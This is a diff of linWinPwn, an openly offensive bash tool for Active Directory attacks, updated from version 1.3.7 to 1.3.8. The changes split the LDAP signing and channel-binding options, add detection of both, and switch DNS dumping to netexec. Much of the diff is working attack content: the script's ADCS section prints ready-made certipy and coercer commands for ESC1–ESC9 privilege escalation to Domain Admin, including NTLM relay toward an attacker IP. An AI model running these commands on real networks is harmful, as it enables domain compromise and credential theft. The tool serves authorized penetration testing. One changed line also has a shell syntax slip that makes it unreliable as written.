@@ -33,7 +33,8 @@ aeskey_bool=false
 cert_bool=false
 autoconfig_bool=false
 ldaps_bool=false
-ldapbindsign_bool=false
+ldapsign_bool=false
+ldapbind_bool=false
 forcekerb_bool=false
 verbose_bool=false
 dnstcp_bool=false
@@ -156,7 +157,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.3.7 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.8 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -182,7 +183,8 @@ help_linWinPwn() {
     echo -e "--dc-domain         Specify the Domain Controller's domain, if netexec fails to obtain it"
     echo -e "--ldap-port         Use custom LDAP port (default port 389)"
     echo -e "--ldaps             Use LDAPS instead of LDAP (port 636)"
-    echo -e "--ldap-bind-sign    Use LDAP Channel Binding (LDAPS) / LDAP Signing (LDAP)"
+    echo -e "--ldap-sign         Use LDAP Signing (LDAP)"
+    echo -e "--ldap-bind         Use LDAP Channel Binding (LDAPS)"
     echo -e "--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)"
     echo -e "--dns-ip            Use Custom IP for DNS (instead of the DomainController)"
     echo -e "--dns-tcp           Use TCP protocol for DNS (when possible)"
@@ -294,8 +296,12 @@ while test $# -gt 0; do
         ldap_port="636"
         args+=("$1")
         ;;
-    --ldap-bind-sign)
-        ldapbindsign_bool=true
+    --ldap-sign)
+        ldapsign_bool=true
+        args+=("$1")
+        ;;
+    --ldap-bind)
+        ldapbind_bool=true
         args+=("$1")
         ;;
     --force-kerb)
@@ -494,6 +500,25 @@ prepare() {
         # Extract NETBIOS name and domain from dc_info
         dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
 
+        # Detect LDAP signing enforcement from netexec output
+        if [[ $dc_info == *"signing:True"* ]] || [[ $dc_info == *"signing:Enforced"* ]]; then
+            ldapsign_bool=true
+        fi
+
+        # Detect LDAP channel binding enforcement from netexec output
+        # Note: Channel binding can only be accurately detected via LDAPS (port 636)
+        if [[ $dc_info == *"channel binding:Always"* ]] || [[ $dc_info == *"channel binding:True"* ]]; then
+            ldapbind_bool=true
+            ldaps_bool=true
+        elif [[ $dc_info == *"channel binding:Unknown"* ]]; then
+            # Query LDAPS to get accurate channel binding status
+            dc_info_ldaps=$(${netexec} ldap --port 636 "${dc_ip}" 2>/dev/null | grep -v "\[-\]\|Connection refused")
+            if [[ $dc_info_ldaps == *"channel binding:Always"* ]] || [[ $dc_info_ldaps == *"channel binding:True"* ]]; then
+                ldapbind_bool=true
+                ldaps_bool=true
+            fi
+        fi
+
         # If dc_domain is missing, use the provided dc domain
         if [ -z "$dc_domain" ]; then
             dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
@@ -556,9 +581,11 @@ prepare() {
     mkdir -p "${Users_dir}"
     mkdir -p "${Scans_dir}"
 
-    if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1 && [ "${offline_bool}" == "false" ]; then
-        ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt;
-        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt)
+    if [ "${offline_bool}" == "false" ]; then
+        if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1; then
+            ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt;
+        fi
+        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt 2>/dev/null)
     fi
     if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
@@ -956,6 +983,12 @@ authenticate() {
         fi
     fi
 
+    if [ "${dnstcp_bool}" == true ]; then
+        argument_ne="${argument_ne} --dns-server ${dns_ip} --dns-tcp"
+    else
+        argument_ne="${argument_ne} --dns-server ${dns_ip}"
+    fi
+
     if [ "${verbose_bool}" == true ]; then
         ne_verbose="--verbose"
         argument_imp="-debug ${argument_imp}"
@@ -1011,32 +1044,25 @@ parse_users() {
 }
 
 dns_enum() {
-    if ! stat "${adidnsdump}" >/dev/null 2>&1; then
-        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
-        echo -e ""
-    else
-        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
-        dns_records="${Servers_dir}/dns_records_${dc_domain}.csv"
-        if ! stat "${dns_records}" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
-            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                echo -e "${PURPLE}[-] adidnsdump does not support Kerberos authentication${NC}"
-            else
-                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-                if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-                run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} ${dnstcp_param} ${dns_ip}" | tee "${Servers_dir}/adidnsdump_output_${dc_domain}.txt"
-                if [ -s "records.csv" ]; then
-                    mv records.csv "${Servers_dir}/dns_records_${dc_domain}.csv"
-                    grep "A," "${Servers_dir}/dns_records_${dc_domain}.csv" | grep -v "DnsZones\|@" | cut -d "," -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${Servers_dir}/servers_list_dns_${dc_domain}.txt"
-                    grep "A," "${Servers_dir}/dns_records_${dc_domain}.csv" | grep -v "DnsZones\|@" | cut -d "," -f 3 >"${Servers_dir}/servers_ip_list_dns_${dc_domain}.txt"
-                    grep "@" "${Servers_dir}/dns_records_${dc_domain}.csv" | grep "NS," | cut -d "," -f 3 | sed 's/\.$//' >"${Servers_dir}/dc_list_dns_${dc_domain}.txt"
-                    grep "@" "${Servers_dir}/dns_records_${dc_domain}.csv" | grep "A," | cut -d "," -f 3 >"${Servers_dir}/dc_ip_list_dns_${dc_domain}.txt"
-                fi
-            fi
-            parse_servers
-        else
-            parse_servers
-            echo -e "${YELLOW}[i] DNS dump found, skipping... ${NC}"
+    echo -e "${BLUE}[*] DNS dump using netexec get-network${NC}"
+    dns_records="${Servers_dir}/dns_records_${dc_domain}.txt"
+    if ! stat "${dns_records}" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-network -o ALL=true" 2>&1 | tee "${Servers_dir}/net_get_network_output_${dc_domain}.txt"
+        # Find and copy the output file from netexec logs
+        nxc_dns_log=$(ls -t /home/*/.nxc/logs/${dc_domain}_network_*.log 2>/dev/null | head -1)
+        if [ -z "$nxc_dns_log" ]; then
+            nxc_dns_log=$(ls -t /root/.nxc/logs/${dc_domain}_network_*.log 2>/dev/null | head -1)
         fi
+        if [ -n "$nxc_dns_log" ] && [ -s "$nxc_dns_log" ]; then
+            cp "$nxc_dns_log" "${dns_records}" 2>/dev/null
+            awk -F "\t " '{print $2}' "${dns_records}" | sed -n 's/\([0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}\).*/\1/p' | sort -uf > "${Servers_dir}/servers_ip_list_dns_${dc_domain}.txt"
+            awk -F "\t " '{print $2}' "${dns_records}" | sed '/\([0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}\)/d' | sed 's/.$//' | sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
+            grep -i "msdcs" "${dns_records}" | awk -F'\t ' '{print $2}' | sed 's/.$//' |  sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
+        fi
+        parse_servers
+    else
+        parse_servers
+        echo -e "${YELLOW}[i] DNS dump found, skipping... ${NC}"
     fi
     echo -e ""
 }
@@ -1127,8 +1153,8 @@ bhd_enum() {
         else
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHound_${user_var}" || exit
-            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbind_param}"; else ldaps_param=""; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
             run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
@@ -1162,8 +1188,8 @@ bhd_enum_dconly() {
         else
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHound_${user_var}" || exit
-            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbind_param}"; else ldaps_param=""; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
             run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
@@ -1198,7 +1224,8 @@ bhdce_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_var}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
@@ -1230,7 +1257,8 @@ bhdce_enum_dconly() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
             /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
             /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
@@ -1259,8 +1287,8 @@ ldapdomaindump_enum() {
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] ldapdomaindump does not support Kerberos authentication ${NC}"
         else
-            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="${ldapbindsign_param} ldaps"; else ldaps_param="ldap"; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="${ldapbind_param} ldaps"; else ldaps_param="ldap"; fi
             run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip}:${ldap_port} -o ${DomainRecon_dir}/LDAPDomainDump" | tee "${DomainRecon_dir}/LDAPDomainDump/ldd_output_${dc_domain}.txt"
         fi
         if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" ]; then
@@ -1959,16 +1987,12 @@ certipy_enum() {
         else
             current_dir=$(pwd)
             cd "${ADCS_dir}" || exit
-            if [ "${ldaps_bool}" == true ]; then
-                ldaps_param=""
-                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-            else
-                ldaps_param="-ldap-scheme ldap"
-                if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-            fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -1978,20 +2002,16 @@ certipy_enum() {
 
 adcs_vuln_parse() {
     ne_adcs_enum
-    if [ "${ldaps_bool}" == true ]; then
-        ldaps_param=""
-        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-    else
-        ldaps_param="-ldap-scheme ldap"
-        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-    fi
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+        if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
+        if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
     esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
     if [[ -n $esc1_vuln ]]; then
         echo -e "\n${GREEN}[+] ESC1 vulnerability potentially found! Follow steps below for exploitation:${NC}"
         for vulntemp in $esc1_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip}"
         done
@@ -2003,9 +2023,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc2_3_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2017,11 +2037,11 @@ adcs_vuln_parse() {
         for vulntemp in $esc4_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2033,7 +2053,7 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2045,15 +2065,15 @@ adcs_vuln_parse() {
         for vulnca in $esc7_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -add-officer '${user}' -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2065,9 +2085,9 @@ adcs_vuln_parse() {
         for vulnca in $esc8_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ] ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
             echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2079,13 +2099,13 @@ adcs_vuln_parse() {
         for vulntemp in $esc9_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hashes <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Authenticate as the target administrator:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2111,7 +2131,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc13_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate from the vulnerable template:${NC}"
